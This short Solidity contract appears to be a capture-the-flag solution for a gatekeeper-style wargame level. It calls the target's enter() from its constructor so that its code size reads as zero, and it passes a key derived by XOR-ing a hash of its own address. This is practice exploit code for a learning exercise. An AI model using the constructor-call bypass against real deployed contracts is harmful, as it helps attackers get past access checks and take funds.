// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGate{
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GateTwoCrack{
    // Code is not yet finish deploy in constructor ( codesize is 0 )
    constructor(IGate _gate) public{
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1));
        _gate.enter(key);
    }
}
